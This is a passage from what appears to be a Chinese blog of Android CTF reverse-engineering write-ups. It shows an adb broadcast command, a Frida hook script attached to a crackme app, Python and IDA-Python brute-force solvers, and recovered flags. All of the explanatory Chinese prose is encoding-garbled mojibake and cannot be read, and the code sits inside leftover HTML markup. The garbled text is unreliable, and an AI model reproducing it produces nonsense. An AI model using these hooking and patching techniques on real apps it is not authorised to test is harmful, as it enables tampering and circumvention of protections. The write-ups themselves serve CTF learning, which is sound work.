com.example.test.ctf02/.NextContent</span><br></pre></td></tr></table></figure><p>æœ€åå­¦ä¹ çŸ¥é“äº†<strong>é‚£ä¸ªå›¾ç‰‡æ˜¾ç¤ºç å…¶å®è§¦å‘å¹¿æ’­éœ€è¦çš„å¯†ç </strong>ï¼Œåœ¨æ¸…å•æ–‡ä»¶æœ‰ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220152303564.png" alt="image-20210220152303564"></p><p>ä¸”<strong>android:exported=â€trueâ€</strong>å±æ€§ä»£è¡¨å¯ä»¥è¿›è¡Œå¤–éƒ¨è°ƒç”¨ï¼Œé‚£æˆ‘ä»¬è¿˜å¯ä»¥ç”¨adbæ„é€ ä¸€ä¸ªå¹¿æ’­æ¥è¾¾åˆ°ç›®çš„ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.is.very.fun</span><br></pre></td></tr></table></figure><h3 id="APKé€†å‘"><a href="#APKé€†å‘" class="headerlink" title="APKé€†å‘"></a>APKé€†å‘</h3><p>æŠŠTenshineè¿›è¡Œmd5().hexdigest()åŠ å¯†åå–å‡ºå¶æ•°ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = md5(<span class="string">b'Tenshine'</span>).hexdigest()</span><br><span class="line">flag = [s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)) <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¾ˆç®€å•ï¼Œä½†æ˜¯ä»æ­ç¯å¢ƒå¼€å§‹é€šè¿‡è¿™ä¸ªé¢˜å­¦äº†ä¸€ä¸‹frida hook javaå±‚ã€‚</p><p>ç®€å•è®°å½•ä¸€ä¸‹æµç¨‹ï¼š</p><blockquote><ol><li>å®‰å“ç«¯æ‰§è¡Œä¸‹è½½å¥½çš„å¯¹åº”fridaæœåŠ¡ã€‚</li><li>è¿›è¡Œ2æ¬¡ç«¯å£è½¬å‘ï¼š<strong><code>adb forward tcp:27043 tcp:27043</code>å’Œ<code>adb forward tcp:27042 tcp:27042</code></strong></li><li>å®‰å“ç«¯è¿è¡Œapp</li><li>æ‰§è¡Œå†™å¥½çš„hookè„šæœ¬ã€‚</li></ol></blockquote><p>è´´ä¸‹hookä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">'''</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use('com.example.crackme.MainActivity');</span></span><br><span class="line"><span class="string">        MainActivity.toHexString.implementation = function(a, b)&#123;</span></span><br><span class="line"><span class="string">            var ans = this.toHexString(a, b);</span></span><br><span class="line"><span class="string">            send(ans);</span></span><br><span class="line"><span class="string">            return ans;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(message[<span class="string">'payload'</span>][::<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">'com.example.crackme'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h3 id="äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200"><a href="#äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200" class="headerlink" title="äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200"></a>äººæ°‘çš„åä¹‰-æŠ“æ•èµµå¾·æ±‰1-200</h3><p>ä¸€ä¸ªjaråŒ…ï¼Œç”¨jd-guiçœ‹ä¸€ä¸‹javaä»£ç ã€‚ä¸€ä¸ªmd5åŠ å¯†ï¼Œåœ¨çº¿è§£ä¸€ä¸‹å³å¯ã€‚</p><p>è¿™é‡Œäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ—¶å€™jaråŒ…ï¼š<strong>jaråŒ…æ˜¯eclipseä¸‹çš„å‹ç¼©åŒ…ï¼Œç”±å¤šä¸ªclassæ–‡ä»¶å‹ç¼©è€Œæˆçš„ã€‚</strong></p><h3 id="boomshakalaka-3"><a href="#boomshakalaka-3" class="headerlink" title="boomshakalaka-3"></a>boomshakalaka-3</h3><p>é£æœºå¤§æˆ˜æ¸¸æˆã€‚</p><p>jebåç¼–è¯‘åæ‰¾åˆ°å…¥å£ç±»ï¼šå¤šæ¬¡è°ƒç”¨äº†aç±»ä¸­çš„dæ–¹æ³•ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224192959108.png" alt="image-20210224192959108"></p><p>çœ‹çœ‹aç±»dæ–¹æ³•åŠŸèƒ½ï¼šå…¶ä¸­getSharedPreferences()æ˜¯å…³é”®ï¼Œè¿”å›ä¸€ä¸ªSharedPreferenceå¯¹è±¡ï¼Œå®ƒä¼šåœ¨/data/data/com.example.plane/ä¸‹ç”Ÿæˆä¸€ä¸ªxmlæ–‡ä»¶ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨å‘å…¶ä¸­è¾“å…¥çš„æ•°æ®ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224193105424.png" alt="image-20210224193105424"></p><p>adbçœ‹ä¸€ä¸‹ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195210759.png" alt="image-20210224195210759"></p><p>ä½†ç¨‹åºæç¤ºçš„æ‰“åˆ°æœ€é«˜åˆ†ï¼Œjavaå±‚æ²¡æœ‰ä»»ä½•ä¸åˆ†æ•°ç›¸å…³çš„åœ°æ–¹ï¼Œè¿›å…¥soä¸­æ‰¾åˆ°åˆ†æ•°çš„åœ°æ–¹ï¼šåˆ†æä¸‹ä¸”ä»DATAå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå°±æ˜¯æ ¹æ®æˆ‘ä»¬æ‰“çš„åˆ†æ•°ä¸æ–­å‘xmlæ–‡ä»¶ä¸­æ·»åŠ å†™å…¥ä¸åŒçš„å­—ç¬¦ä¸²ã€‚<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195529004.png" alt="image-20210224195529004"></p><p>è€Œè¦å†™å…¥å­—ç¬¦ä¸²å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾æ˜¯ç¡®å®šäº†çš„ï¼Œåªæ˜¯ä¸­é—´çš„å­—ç¬¦ä¸²ä¼šå› ä¸ºåˆ†æ•°ä¸åŒè€Œä¸é€šè¿‡ï¼Œè¿™ä¸ªè‡ªå·±æ‰“æ¸¸æˆç„¶åæŸ¥çœ‹æ•°æ®æˆ–è€…ç›´æ¥idaä¸­åˆ†æéƒ½å¯ä»¥çŸ¥é“ã€‚</p><p>æ³¨æ„çš„åœ°æ–¹ï¼šè¦æŒ‡å®šçš„åˆ†æ•°æ‰ä¼šå†™å…¥æŒ‡å®šå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¦‚æœæ‰“æ¸¸æˆæµ‹è¯•çš„è¯è¦ç®—ç€æ‰“ğŸ˜‚ã€‚</p><p>æµ‹è¯•ä¸€æ³¢åï¼Œå†™å…¥é¡ºåºå°±æ˜¯ç»™å‡ºçš„ï¼ŒæŠŠå¼€å§‹ç»“å°¾ç¡®å®šå¥½åå‘ä¸­é—´å¡«å……å¥½base64è§£ç å¾—åˆ°flagã€‚</p><p><strong>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224202624546.png" alt="image-20210224202624546"></p><h3 id="android1"><a href="#android1" class="headerlink" title="android1"></a>android1</h3><p>appè¿›è¡Œäº†æ¢†æ¢†åŠ å›ºï¼Œå¼€å§‹å‡†å¤‡ç¯å¢ƒå®‰è£…dump dexï¼Œå‡†å¤‡å®Œå¼€å§‹å®‰è£…appå‘ç°æŠ¥é”™ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210225225117463.png" alt="image-20210225225117463"></p><p>åé¢æ‰å‘ç°äº†æ˜¯å› ä¸ºappæ²¡æœ‰ç­¾åï¼Œç­¾ä¸Šååè¿˜è¦æ³¨æ„ï¼š</p><p>å®‰è£…æ—¶å¸¦ä¸Š-té€‰é¡¹ã€‚åŸå› ï¼š</p><p>Android Studio 3.0ä¼šåœ¨debug apkçš„<code>manifest</code>æ–‡ä»¶<code>application</code>æ ‡ç­¾é‡Œè‡ªåŠ¨æ·»åŠ  <code>android:testOnly=&quot;true&quot;</code>å±æ€§ã€‚</p><p>æˆåŠŸå®‰è£…ç¨‹åºï¼Œæ‰“å¼€æç¤ºèµ„æºæ–‡ä»¶ï¼Œè¿›è€Œä»valuesçš„string.xmlä¸­æ‰¾åˆ°flagã€‚</p><p><strong>flag{1FF9B2CCB90A2D943DBAA072DF0A279C}</strong></p><h3 id="Android2-0"><a href="#Android2-0" class="headerlink" title="Android2.0"></a>Android2.0</h3><p>ç®€å•è€ƒäº†ä¸€ä¸‹soå±‚ã€‚</p><p><strong>flag{sosorryla}</strong></p><h3 id="Illusion"><a href="#Illusion" class="headerlink" title="Illusion"></a>Illusion</h3><p>å…³é”®å°±åœ¨soå±‚çš„ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œå¼€å§‹ç›´æ¥åœ¨Exportsæ‰¾åˆ°åç§°ä¸ºCheckFlagçš„å‡½æ•°ï¼Œä¸ºäº†ç†Ÿæ‚‰ä¸€ä¸‹soå±‚çš„è°ƒè¯•ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹äº†æ–­ç‚¹ä½†æ¯æ¬¡éƒ½ä¸æ–­ä¸ä¸‹æ¥ã€‚ã€‚</p><p>ç„¶åå¼€å§‹æ‰¾åŸå› ï¼Œåé¢å‘ç°è¿™ä¸ªå‡çš„å‡½æ•°ï¼ŒçœŸæ­£æ˜¯åŠ¨æ€åŠ è½½çš„ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203021780.png" alt="image-20210303203021780"></p><p>è¿›å…¥æ­£ç¡®çš„å‡½æ•°å¼€å§‹åˆ†æï¼Œå‡½æ•°çš„ä¼ªä»£ç æ˜æ˜¾æ˜¯æœ‰ç‚¹é—®é¢˜çš„ï¼Œçœ‹armæ±‡ç¼–å°±å¥½äº†ã€‚</p><p>å…¶ä¸­å…³é”®å°±æ˜¯<strong>sub_CCB09028</strong>è¿™ä¸ªå‡½æ•°ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203358493.png" alt="image-20210303203358493"></p><p>åˆ†æäº†ä¸€ä¸‹æ²¡çœ‹å‡ºæ‰€ä»¥ç„¶ï¼Œä½†è¿™ä¸ªæ˜¯ä¸€ä½ä¸€ä½åŠ å¯†çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç©·ä¸¾çš„ã€‚</p><p>å†™ida-pythonï¼Œä½†è¿™ä¸ªç©·ä¸¾æœ€åä¸€ä½æœ‰2ä¸ªå­—ç¬¦éƒ½å¯ï¼Œç©ºæ ¼å’Œâ€˜}â€™ï¼Œè¿˜å¥½æ˜¯æœ€åä¸€ä½ï¼Œé‚£è‚¯å®šæ˜¯å­—ç¬¦}äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">"Ku@'G_V9v(yGS"</span></span><br><span class="line">s = <span class="string">'(Ljava/lang/String;Ljava/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a1, a2)</span>:</span></span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 &gt;= a2:  </span><br><span class="line">        <span class="keyword">while</span> a2 &lt; a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2:</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">1</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">2</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">3</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span>      </span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        r1 = j+ord(s[i])<span class="number">-64</span></span><br><span class="line">        r2 = <span class="number">0x5d</span></span><br><span class="line">        <span class="keyword">if</span> r1 - fun(r1, r2)*<span class="number">0x5d</span> + <span class="number">0x20</span> == ord(enc[i]):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag.encode())</span><br><span class="line"><span class="comment">#CISCN&#123;GJ5728&#125;</span></span><br></pre></td></tr></table></figure><p>å†™å®Œä»”ç»†åˆ†æäº†ä¸‹é‚£ä¸ªå‡½æ•°ï¼Œå…¶å®è¯¥å‡½æ•°å’Œåé¢å¯¹å‡½æ•°è¿”å›å€¼çš„å¤„ç†å°±æ˜¯<strong>æ±‚æ¨¡ï¼ˆmodï¼‰</strong>çš„æ“ä½œï¼Œä½†æ²¡æœ‰ä½¿ç”¨/ä¸modï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹ã€‚è¿™ä»æœ€åçš„æ“ä½œçœ‹å…¶å®å¾ˆæ˜æ˜¾ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303204003498.png" alt="image-20210303204003498"></p><h3 id="APKé€†å‘-2"><a href="#APKé€†å‘-2" class="headerlink" title="APKé€†å‘-2"></a>APKé€†å‘-2</h3><p>é¦–å…ˆå®‰è£…appå¤±è´¥ã€‚ã€‚</p><p>åç¼–è¯‘åé¦–å…ˆçœ‹äº†ä¸€ä¸‹<strong>AndroidManifest.xml</strong>ï¼Œå‘ç°ç©ºçš„ã€‚ã€‚ç„¶åçœ‹äº†appçš„ä¸»è¦é€»è¾‘å’Œç±»ï¼Œå¾ˆä¹±å’Œæ‚å§ï¼Œä¹Ÿä¸æ¸…æ¥šè¦åšä»€ä¹ˆã€‚ã€‚</p><p>ç„¶åæˆ‘ä¸ºäº†çœ‹å…¶ä¸­çš„ä¸€ä¸ªèµ„æºæ–‡ä»¶å¯¹appè¿›è¡Œäº†ç›´æ¥è§£å‹ï¼Œè¿™ä¸ªå€’æ˜¯æ²¡çœ‹å‡ºä»€ä¹ˆã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192508917.png" alt="image-20210304192508917"></p><p>ä½†åœ¨å…¶ä¸­çœ‹åˆ°<strong>AndroidManifest.xml</strong>å¹¶ä¸æ˜¯ç©ºçš„ï¼Œç„¶åå°è¯•ä½¿ç”¨apktoolå¯¹apkè§£åŒ…ï¼Œè§£åŒ…å¤±è´¥ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192711623.png" alt="image-20210304192711623"></p><p>ç”±æ­¤å¯ä»¥çŸ¥é“ï¼Œåº”è¯¥æ˜¯å¯¹<strong>AndroidManifest.xml</strong>æ–‡ä»¶åšäº†æ‰‹è„šã€‚</p><p>ç„¶åå°±æ˜¯è¦çŸ¥é“å®‰å“<strong>AndroidManifest.xml</strong>æ–‡ä»¶æ ¼å¼äº†ï¼Œè¿™æ˜¯ä¿®æ”¹è¿‡çš„ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193133042.png" alt="image-20210304193133042"></p><p>å†çœ‹ä¸€ä¸ªæ­£å¸¸çš„ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193230661.png" alt="image-20210304193230661"></p><p>é€šè¿‡ä¿®å¤åï¼Œé‡æ–°å‹ç¼©æˆå‹ç¼©åŒ…ï¼Œåœ¨xmlæ–‡ä»¶ä¸­çœ‹åˆ°flagç›¸å…³ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/H1aGYAcMoEPShpW.png" alt="image-20210304193456601"></p><h3 id="ill-intentions"><a href="#ill-intentions" class="headerlink" title="ill-intentions"></a>ill-intentions</h3><p>åœ¨MainActivityä¸­æ³¨å†Œäº†ä¸€ä¸ªå¹¿æ’­æ¥æ”¶å™¨ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193418021.png" alt="image-20210305193418021"></p><p>æ ¹æ®åœ¨è®¾ç½®åœ¨å±å¹•ä¸Šçš„æ–‡æœ¬æ¥çœ‹Send_to_Activityï¼Œå°±æ˜¯æ ¹æ®æ¥å—åˆ°çš„ä¸åŒå¹¿æ’­æ¶ˆæ¯æ‰§è¡Œä¸åŒçš„å‡½æ•°ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193507242.png" alt="image-20210305193507242"></p><p>ç„¶åçœ‹äº†ä¸€ä¸‹ä¸‰ä¸ªä¸åŒçš„å‡½æ•°ï¼Œå…¶æ‰§è¡Œé€»è¾‘å…¶å®æ˜¯ä¸€æ ·çš„ï¼ŒæŠŠ3ä¸ªæŒ‡å®šå­—ç¬¦ä¸²ç»è¿‡sha224ä¸base64åŠæ›¿æ¢åŠ å¯†åå†ç»è¿‡soå±‚å‡½æ•°çš„æ“ä½œï¼Œæœ€åæŠŠç»“æœä»¥å¹¿æ’­å½¢å¼å‘å‡ºï¼Œä½†è¿™é‡Œå¹¶ä¸æ˜¯å‘é€ç»™Send_to_Activityã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305213542600.png" alt="image-20210305213542600"></p><p>soå±‚çš„åŠ å¯†æ“ä½œä¸€ä¸ªå¼‚æˆ–ï¼Œèƒ½æƒ³åˆ°è¿ç®—ç»“æœå°±æ˜¯æˆ‘ä»¬è¦çš„flagã€‚</p><p>ç”±äºåªæœ‰ä¸‰ç§ç»“æœï¼Œç”¨ida-pythonæ¨¡æ‹Ÿäº†ç¨‹åºçš„è¿ç®—é€»è¾‘ï¼Œåœ¨IsThisTheRealOneæ´»åŠ¨å¾—åˆ°flagã€‚è¿™é‡Œå¼€å§‹ä¸€ç›´å‡ºé”™å¾—ä¸åˆ°ç»“æœï¼Œåé¢è°ƒè¯•å‘ç°æ˜¯getClass().getName()å¾—åˆ°çš„ç±»åæˆ‘æ²¡æœ‰æŠŠæ•´ä¸ªåŒ…åŠ ä¸Šã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha224</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = [<span class="string">'e'</span>, <span class="string">'W'</span>, <span class="string">'h'</span>, <span class="string">'a'</span>, <span class="string">'t'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'d'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = sha224(s.encode()).hexdigest().encode()</span><br><span class="line">    s = base64.b64encode(s).decode().replace(<span class="string">'='</span>, <span class="string">'?'</span>)</span><br><span class="line">    s = list(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        temp = ord(s[i])</span><br><span class="line">        <span class="keyword">if</span>  temp &gt; <span class="number">47</span> <span class="keyword">and</span> temp &lt; <span class="number">58</span>:</span><br><span class="line">            s[i] = a[temp<span class="number">-48</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s)</span><br><span class="line">    </span><br><span class="line">s1 = <span class="string">b'TRytfrgooq|F&#123;i-JovFBungFk'</span>+<span class="string">b'\\VlphgQbwvj~HuDgaeTzuSt.@Lex^~'</span></span><br><span class="line">s1 = list(s1) + [<span class="number">119</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">123</span>, <span class="number">79</span>, <span class="number">117</span>, </span><br><span class="line">  <span class="number">116</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">127</span>, <span class="number">114</span>, <span class="number">67</span>] + list(<span class="string">b'tfqm&#125;'</span>)</span><br><span class="line">s2 = <span class="string">'SendAnIntentApplication'</span></span><br><span class="line">s3 = <span class="string">'com.example.application.IsThisTheRealOne$1'</span></span><br><span class="line">s3 = s3[<span class="number">0</span>:len(s3)<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">s2 = en(s2).encode()</span><br><span class="line">s3 = en(s3).encode()</span><br><span class="line">print(<span class="string">'---------------------------------------------------'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">76</span>):</span><br><span class="line">    print(chr(s1[i]^s2[i]^s3[i]), end = <span class="string">''</span>)</span><br><span class="line"><span class="comment">#Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œç”±äºappä¸­æ˜¯å¤šä¸ªæ´»åŠ¨ï¼Œå¼€å§‹æˆ‘æ˜¯æƒ³ç›´æ¥ç”¨adbå‘½ä»¤æ¥å¯åŠ¨æ¯ä¸ªæ´»åŠ¨ï¼Œé€šè¿‡è°ƒè¯•çœ‹è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Œä½†éƒ½å¯åŠ¨å¤±è´¥ï¼Œä»€ä¹ˆæƒé™ç¦æ­¢ã€‚é€šè¿‡è®¡ç®—å¾—åˆ°flagåï¼Œé€šè¿‡æœé›†å‘ç°æ˜¯è¦å¯¹æ´»åŠ¨æ²¡æœ‰æŒ‡å®šå±æ€§<strong>android:exported=â€trueâ€</strong>ï¼Œ</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305222644097.png" alt="image-20210305222644097"></p><blockquote><p><strong>android.intent.action.MAINï¼šå†³å®šåº”ç”¨çš„å…¥å£Activityï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯åŠ¨åº”ç”¨æ—¶é¦–å…ˆæ˜¾ç¤ºå“ªä¸€ä¸ªActivityã€‚</strong><br><strong>android.intent.category.LAUNCHERï¼šè¡¨ç¤ºactivityåº”è¯¥è¢«åˆ—å…¥ç³»ç»Ÿçš„å¯åŠ¨å™¨(launcher)(å…è®¸ç”¨æˆ·å¯åŠ¨å®ƒ)ã€‚Launcheræ˜¯å®‰å“ç³»ç»Ÿä¸­çš„æ¡Œé¢å¯åŠ¨å™¨ï¼Œæ˜¯æ¡Œé¢UIçš„ç»Ÿç§°ã€‚</strong></p></blockquote><p>æŒ‡å®šåé€šè¿‡adbå‘½ä»¤å¯åŠ¨æˆåŠŸï¼Œå¯ç›´æ¥é€šè¿‡è°ƒè¯•æŸ¥çœ‹ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œæˆ‘å°è¯•ä¿®æ”¹smaliæ¥æ’å…¥æ‰“å°Logçš„è¯­å¥ï¼Œç„¶ååŒä¼™æŸ¥çœ‹æ—¥å¿—åŒæ ·å¾—åˆ°flagã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223009728.png" alt="image-20210305223009728"></p><p>æœ€åæŸ¥çœ‹æ—¥å¿—ï¼š<br><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223046697.png" alt="image-20210305223046697"></p><h2 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h2><h3 id="No-Name"><a href="#No-Name" class="headerlink" title="No Name"></a>No Name</h3><p>æ‰¾åˆ°å…¥å£æ´»åŠ¨ï¼Œå°†è¾“å…¥ä¼ å…¥FlagCheckerç±»çš„checkFlagå‡½æ•°ï¼Œç„¶ååˆæ˜¯å®ç°æ¥å£ä¸­çš„checkå‡½æ•°ï¼Œæœ€åè°ƒç”¨ï¼Œæ„Ÿè§‰æœ‰ç‚¹å¥—å¨ƒï¼Œï¼Œå®è´¨å°±æ˜¯è°ƒç”¨nativeå±‚çš„checkå‡½æ•°ã€‚ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310201450601.png" 